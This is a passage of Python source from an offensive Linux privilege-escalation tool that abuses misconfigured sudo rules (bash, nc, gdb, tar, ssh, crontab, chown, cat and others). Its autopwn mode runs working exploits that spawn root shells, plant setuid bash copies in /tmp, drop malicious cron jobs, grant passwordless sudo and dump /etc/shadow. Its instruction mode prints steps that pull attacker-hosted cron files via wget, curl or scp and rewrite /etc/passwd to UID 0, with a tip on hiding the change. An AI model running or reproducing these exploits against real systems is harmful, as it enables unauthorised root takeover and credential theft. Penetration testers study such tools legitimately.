                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
                call("sudo ruby /tmp/pwn.rb", shell=True)
            else:
                print(OKGREEN + "\n[!] Obtianing shell as " + ruby_user + "!" + ENDC)
                call("sudo -u " + ruby_user + " ruby /tmp/pwn.rb", shell=True)

        if question == False:
            sudopwner()

# SUDO bash Rule Pwnage
def bash(bash_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule type the following command: " + ENDC)
        if (bash_user == "ALL") or (bash_user == "root"):
            print(OKRED + "[*] sudo bash -i" + ENDC)
        else:
            print(OKRED + "[*] sudo -u " + bash_user + " bash -i" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:
    
        question = ask_user( OKRED + "\n[?] Do you wish to abuse the bash rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the bash rule now!!!" + ENDC)
            print(OKGREEN + "[+] Obtaining bash shell by passing the -i argument!" + ENDC)

            if (bash_user == "ALL") or (bash_user == "root"):
                print(OKGREEN + "\n[!] Obtaining shell as root!" + ENDC)
                call("sudo bash -i", shell=True)
            else:
                print(OKGREEN + "\n[!] Obtaining shell as " + bash_user + "!" + ENDC)
                call("sudo -u " + bash_user + " bash -i", shell=True)

        if question == False:
            sudopwner()


# SUDO nc Rule Pwnage
def nc():

    rule = "nc"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"""
sudo {cmd} -lvp 8888 -e '/bin/bash' &
sleep 2
( sleep 5 && killall cat ) &
(echo "cp {pwncron_script} {pwncron_crond}"; cat;) | {cmd}  127.0.0.1 8888
"""    
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO less Rule Pwnage
def less(less_user):

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] The first step is to open a file using the 'less' command: " + ENDC)
    if (less_user == "ALL") or (less_user == "root"):
        print(OKRED + " [*] sudo less <filename>" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + less_user + " less <filename>" + ENDC)
    print(OKBLUE + "[2] Once the file is open type '!/bin/bash': " + ENDC)
    print(OKRED + " [*] !/bin/bash" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO more Rule Pwnage
def more(more_user):

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] The first step is to open a file using the 'more' command: " + ENDC)
    if (more_user == "ALL") or (more_user == "root"):
        print(OKRED + " [*] sudo more <filename>" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + more_user + " more <filename>" + ENDC)
    print(OKBLUE + "[2] Once the file is open type '!/bin/bash': " + ENDC)
    print(OKRED + " [*] !/bin/bash" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO man Rule Pwnage
def man(man_user):

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] The first step is to view the man page of a Linux command: " + ENDC)
    if (man_user == "ALL") or (man_user == "root"):
        print(OKRED + " [*] sudo man bash" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + man_user + " man bash" + ENDC)
    print(OKBLUE + "[2] Once the page is open type '!/bin/bash': " + ENDC)
    print(OKRED + " [*] !/bin/bash" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO gdb Rule Pwnage
def gdb(gdb_user):

    rule = "gdb"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    gdb_script = f"/tmp/gdb.{pid}"
    with open(gdb_script, 'w') as output_file:
        output_file.write(f"!/bin/bash -c 'cp {pwncron_script} {pwncron_crond}'")
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"sudo {cmd} -batch -x {gdb_script}"
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO ftp Rule Pwnage
def ftp(ftp_user):
       
    # ADD AUTO PWNAGE STEPS 

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] The first step is to execute the 'ftp' command: " + ENDC)
    if (ftp_user == "ALL") or (ftp_user == "root"):
        print(OKRED + " [*] sudo ftp" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + ftp_user + " ftp" + ENDC)
    print(OKBLUE + "[2] Once in the ftp prompt type the following: " + ENDC)
    print(OKRED + " [*] !/bin/bash" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO smbclient Rule Pwnage
def smbclient(smbclient_user):
       
    # ADD AUTO PWNAGE STEPS 

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC)
    print(OKBLUE + "[1] Execute the 'smbclient' command, connecting to a valid SMB or CIFS share: " + ENDC)
    if (smbclient_user == "ALL") or (smbclient_user == "root"):
        print(OKRED + " [*] sudo smbclient \\\\\\\\attacker-ip\\\\share-name -U username" + ENDC)
    else:
        print(OKRED + " [*] sudo -u " + smbclient_user + " smbclient \\\\\\\\attacker-ip\\\\share-name -U username" + ENDC)
    print(OKBLUE + "[2] Once in the smbclient prompt (smb: \>), type the following: " + ENDC)
    print(OKRED + " [*] !/bin/bash" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO sed Rule Pwnage
def sed(sed_user):

    rule = "sed"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"echo 'cp {pwncron_script} {pwncron_crond}' | sudo {cmd} e"
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO mysql Rule Pwnage
def mysql(mysql_user):

    rule = "mysql"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"sudo {cmd} -e '\! /bin/bash -c \"cp {pwncron_script} {pwncron_crond}\"'"
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


    return

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule we will execute mysql with the -e argument to execute system command: " + ENDC)
        if (mysql_user == "ALL") or (mysql_user == "root"):
            print(OKRED + " [*] sudo mysql -e '\! /bin/bash'" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + mysql_user + " mysql -e '\! /bin/bash'" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the mysql rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the mysql rule now!!!" + ENDC)
            
            if (mysql_user == "ALL") or (mysql_user == "root"):
                print(OKGREEN + "[!] Running mysql command with -e argument to get root shell!" + ENDC)
                call("sudo mysql -e '\! /bin/bash'", shell=True)
            else:
                print(OKGREEN + "[!] Running mysql command with -e argument to get shell as " + mysql_user + "!" + ENDC)
                call("sudo -u " + mysql_user + " mysql -e '\! /bin/bash'", shell=True)

        if question == False:
            sudopwner()


# SUDO tar Rule Pwnage
def tar(tar_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule we will execute tar with the checkpoint and checkpoint-action argument to execute system command: " + ENDC)
        if (tar_user == "ALL") or (tar_user == "root"):
            print(OKRED + " [*] sudo tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + tar_user + " tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the tar rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the tar rule now!!!" + ENDC)

            if (tar_user == "ALL") or (tar_user == "root"):
                print(OKGREEN + "[!] Running tar command with the checkpoint and checkpoint-action arguments to get root shell!" + ENDC)
                call("sudo tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash", shell=True)
            else:
                print(OKGREEN + "[!] Running tar command with the checkpoint and checkpoint-action arguments to get shell as " + tar_user + "!" + ENDC)
                call("sudo -u " + tar_user + " tar cf /dev/null /tmp/pwnage --checkpoint=1 --checkpoint-action=exec=/bin/bash", shell=True)

        if question == False:
            sudopwner()


# SUDO wget Rule Pwnage
def wget():

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
    print(OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC)
    print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC)
    print(OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[3] Next we need to create a file in a web directory we control containing the file we will pull down and place in cron.d: " + ENDC)
    print(OKRED + " [*] Place this in a web directory you control: */1 * * * * root /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[4] Next we need to pull that file down into /etc/cron.d: " + ENDC)
    print(OKRED + " [*] sudo wget http://<ip>/pwnage -P /etc/cron.d/" + ENDC)
    print(OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO curl Rule Pwnage
def curl():

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
    print(OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC)
    print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC)
    print(OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[3] Next we need to create a file in a web directory we control containing the file we will pull down and place in cron.d: " + ENDC)
    print(OKRED + " [*] Place this in a web directory you control: */1 * * * * root /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[4] Next we need to pull that file down into /etc/cron.d: " + ENDC)
    print(OKRED + " [*] sudo curl http://<ip>/pwnage -o /etc/cron.d/pwnage" + ENDC)
    print(OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO mv Rule Pwnage
def mv():

    rule = "mv"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"sudo {cmd} {pwncron_script} {pwncron_crond}"
    comments = f"This may not work as it creates the {pwncron_crond} file as user {username} instead of root."

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO tee Rule Pwnage
def tee():

    rule = "tee"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"cat {pwncron_script} | sudo {cmd} {pwncron_crond}"
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()



# SUDO scp Rule Pwnage
def scp():

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
    print(OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC)
    print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC)
    print(OKRED + " [*] chmod +x /tmp/pwnage.sh" + ENDC)
    print(OKBLUE + "[3] Next we need to create a file on a remote machine that will be pulled into /etc/cron.d/: " + ENDC)
    print(OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC)
    print(OKBLUE + "[4] Finally we need to scp our pwncron file to our victim /etc/cron.d/ directory: " + ENDC)
    print(OKRED + " [*] sudo scp <user>@<attacker ip>:/tmp/pwncron /etc/cron.d/pwncron" + ENDC)
    print(OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO ssh Rule Pwnage
def ssh(ssh_user):

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
        print(OKBLUE + "[1] First create a malicious script locally that will be executed by ssh." + ENDC)
        print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC)
        print(OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[3] Next we need to execute SSH with ProxyCommand in order to execute our malicious script: " + ENDC)
        if (ssh_user == "ALL") or (ssh_user == "root"):
            print(OKRED + " [*] sudo ssh -o ProxyCommand='/tmp/./evil.sh' <user>@localhost" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + ssh_user + " ssh -o ProxyCommand='/tmp/./evil.sh' <user>@localhost" + ENDC)
        print(OKBLUE + "[5] Finally we wait execute the setuid shell in /tmp/!" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the ssh rule? " + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the ssh rule now!!!" + ENDC)
            print(OKGREEN + "\n[!] Creating malicious file!" + ENDC)
            call("echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            if (ssh_user == "ALL") or (ssh_user == "root"):
                print(OKGREEN + "\n[!] Running ssh command to execute malicious script as root!" + ENDC)
                call("sudo ssh -o ProxyCommand='/tmp/./evil.sh' " + username + "@localhost", shell=True)
            else:
                print(OKGREEN + "\n[!] Running ssh command to execute malicious script as " + ssh_user + "!" + ENDC)
                call("sudo -u " + ssh_user + " ssh -o ProxyCommand='/tmp/./evil.sh' " + username + "@localhost", shell=True)

            print(OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC)

        if question == False:
            sudopwner()


# SUDO cp Rule Pwnage
def cp():

    rule = "cp"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"sudo {cmd} {pwncron_script} {pwncron_crond}"
    comments = ""

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO dd Rule Pwnage
def dd():

    rule = "dd"
    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
    exploit_cmd = f"sudo {cmd} if={pwncron_script} of={pwncron_crond}"
    comments = f"This may not work as it creates the {pwncron_crond} file as user {username} instead of root."

    if args.info:

        pwnit(rule, exploit_cmd, pwnage_script_data,True, comments)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)

        if question == True:

            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)

        if question == False:
            sudopwner()


# SUDO crontab Rule Pwnage
def crontab():

    if args.info:
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
        print(OKBLUE + "[1] First create a malicious script locally that will be executed by cron: " + ENDC)
        print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[2] Next change the rights to that malicious file to be executable: " + ENDC)
        print(OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC)
        print(OKBLUE + "[3] Next we need to create a file that will be placed in roots crontab: " + ENDC)
        print(OKRED + " [*] echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron" + ENDC)
        print(OKBLUE + "[4] Next we need to add that cron to roots crontab: " + ENDC)
        print(OKRED + " [*] sudo sudo crontab /tmp/pwncron" + ENDC)
        print(OKBLUE + "[5] Finally we wait until the file pwnage is executed in cron.d and a setuid binary is created in /tmp/" + ENDC)
        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the crontab rule? " + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the crontab rule now!!!" + ENDC)
            print(OKGREEN + "\n[!] Creating malicious file!" + ENDC)
            call("echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
            call("chmod +x /tmp/evil.sh", shell=True)

            sleep(0.5)

            print(OKGREEN + "\n[!] Creating malicious cron file!" + ENDC)
            call("echo '*/1 * * * * root /tmp/evil.sh' > /tmp/pwncron",shell=True)

            sleep(0.5)

            print(OKGREEN + "\n[!] Running crontab command!" + ENDC)
            call("sudo crontab /tmp/pwncron", shell=True)

            print(OKGREEN + "\n[!] Wait for pwncron to run in 1 minute!" + ENDC)
            print(OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC)

        if question == False:
            sudopwner()


# SUDO chown Rule Pwnage
def chown():

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
    print(OKBLUE + "[1] First we need to change the ownership of /etc/passwd (TAKE NOTE OF YOUR UID FIRST): " + ENDC)
    print(OKRED + " [*] sudo chown " + username + ":root /etc/passwd" + ENDC)
    print(OKBLUE + "[2] Now that we own /etc/passwd we can edit it and change our UID to 0: " + ENDC)
    print(OKRED + " [*] vim /etc/passwd (Change your UID to 0)" + ENDC)
    print(OKBLUE + "[3] Next logout and log back in. You will notice your UID is now 0 and have root level access." + ENDC)
    print(OKBLUE + "[4] To be sneaky we can change the file back to being owned by root: " + ENDC)
    print(OKRED + " [*] sudo chown root:root /etc/passwd" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO chmod Rule Pwnage
def chmod():

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
    print(OKBLUE + "[1] First for safety purposes we need to get the current permissions of /etc/passwd (HINT: SHOULD BE 644): " + ENDC)
    print(OKRED + " [*] stat -c '%a %n' /etc/passwd" + ENDC)
    print(OKBLUE + "[2] Now change the ownership of /etc/passwd so you can edit it (I am doing 777 because why not): " + ENDC)
    print(OKRED + " [*] sudo chmod 777 /etc/passwd" + ENDC)
    print(OKBLUE + "[3] Now that /etc/passwd is world writable we can change our UID to 0: " + ENDC)
    print(OKRED + " [*] vim /etc/passwd (Change your UID to 0)" + ENDC)
    print(OKBLUE + "[4] Next logout and log back in. You will notice your UID is now 0 and have root level access." + ENDC)
    print(OKBLUE + "[5] Finally lets do the right thing and change the permissions back to 644 on /etc/passwd: " + ENDC)
    print(OKRED + " [*] sudo chmod 644 /etc/passwd" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO cat Rule Pwnage
def cat(cat_user):

    if args.info:
        print(OKYELLOW + "\n---------------------------------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
        print(OKBLUE + "[+] To pwn this rule we will use sudo cat to print out a root owned file (this can be any file owned by root you want but we are using /etc/shadow): " + ENDC)
        if (cat_user == "ALL") or (cat_user == "root"):
            print(OKRED + " [*] sudo cat /etc/shadow" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + cat_user + " cat <filename>" + ENDC)
        print(OKYELLOW + "\n---------------------------------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the cat rule? " + ENDC)

        if question == True:

            print(OKGREEN + "[!] Pwning the cat rule now!!!" + ENDC)
            
            if (cat_user == "ALL") or (cat_user == "root"):
                print(OKGREEN + "[!] Running cat command to get /etc/shadow contents!" + ENDC)
                call("sudo cat /etc/shadow", shell=True)
            else:
                filename = input("\n" + OKBLUE + "[?] Enter file path/name of file you wish to cat as user " + cat_user + "(e.g. /home/<user>/.ssh/id_rsa): " + ENDC)
                print(OKGREEN + "[!] Running cat command as " + cat_user + " to get " + filename + "!" + ENDC)
                call("sudo -u " + cat_user + " cat " + filename, shell=True)

        if question == False:
            sudopwner()

# SUDO mount Rule Pwnage
def mount():

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
    print(OKBLUE + "[1] First take a USB drive of your choosing and format it to be ext3 filesystem (Linux command below): " + ENDC)
    print(OKRED + " [*] mkfs -t ext3 <drive>" + ENDC)
    print(OKBLUE + "[2] Now mount it on your attacking computer and place a setuid shell as root within it: " + ENDC)
    print(OKRED + " [*] mount -t ext3 -o 'rw' <drive> <mount point>" + ENDC)
    print(OKRED + " [*] cp /bin/bash <mount point>/pwn ; chmod 4777 <mount point>/pwn" + ENDC)
    print(OKBLUE + "[3] Now take your USB drive and mount it on the victim machine as an ext3 filesystem: " + ENDC)
    print(OKRED + " [*] sudo mount -t ext3 -o 'rw' <drive> <mount point>" + ENDC)
    print(OKBLUE + "[4] Execute the setuid shell within your drive and profit!" + ENDC)
    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
    sys.exit()


# SUDO facter Rule Pwnage
def facter(facter_user):

    if args.info:
        print(OKYELLOW + "\n----------------------------------------------------------------------------------------------------------------------------------------" + ENDC)
        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
        print(OKBLUE + "[1] First create a malicious script locally that will be executed by facter: " + ENDC)
        print(OKRED + " [*] echo 'Facter.add(:pwn) do setcode do pwn = Facter::Util::Resolution.exec('cp /bin/bash /tmp/pwnage; chmod 4777 /tmp/pwnage') end end'" + ENDC)
        print(OKBLUE + "[2] Now execute sudo facter with your new and improved fact script: " + ENDC)
        if (facter_user == "ALL") or (facter_user == "root"):
            print(OKRED + " [*] sudo facter --custom-dir=. pwn" + ENDC)
        else:
            print(OKRED + " [*] sudo -u " + facter_user + " facter --custom-dir=. pwn" + ENDC)
        print(OKBLUE + "[3] Now execute your setuid shell that is waiting for you in /tmp/." + ENDC)
        print(OKYELLOW + "\n----------------------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the facter rule? " + ENDC)

        if question == True:

            print(OKGREEN + "\n[!] Pwning the facter rule now!!!" + ENDC)
            print(OKGREEN + "\n[!] Creating malicious fact!" + ENDC)
            call('''echo "Facter.add(:pwn) do setcode do pwn = Facter::Util::Resolution.exec('cp /bin/bash /tmp/pwnage; chmod 4777 /tmp/pwnage') end end" > pwn.rb''', shell=True)

            sleep(0.5)

            if (facter_user == "ALL") or (facter_user == "root"):
                print(OKGREEN + "\n[!] Executing facter to execute our awesome fact to get setuid shell as root!" + ENDC)
                call("sudo facter --custom-dir=. pwn",shell=True)
            else:
                print(OKGREEN + "\n[!] Executing facter to execute our awesome fact to get setuid shell as " + facter_user + "!" + ENDC)
                call("sudo -u " + facter_user + " facter --custom-dir=. pwn", shell=True)

            sleep(0.5)

            print(OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC)

        if question == False:
            sudopwner()


# SUDO apt-get Rule Pwnage
def aptget():

    print(OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
    print(OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC)
    print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
    print(OKBLUE + "[1] First we need to execute apt-get changelog <program> in order to get into pager: " + ENDC)
    print(OKRED + " [*] sudo apt-get changelog bash" + ENDC)
